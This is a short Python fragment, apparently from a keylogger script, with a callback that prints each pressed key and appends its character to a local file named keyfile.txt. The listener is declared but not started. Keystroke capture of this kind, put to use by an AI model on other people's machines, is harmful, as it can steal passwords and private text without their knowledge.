def keyPressed(key):
    print(str(key))
    # create/opens a file to store logged keys
    with open("keyfile.txt", 'a') as logKey:
        try:
            # gets key character
            char = key.char
            # writes key character to the file
            logKey.write(char)
        # catches any exceptions (general catch-all)
        except Exception as e:
            print(f"Error getting char: {str(e)}")

keyboard_listener = None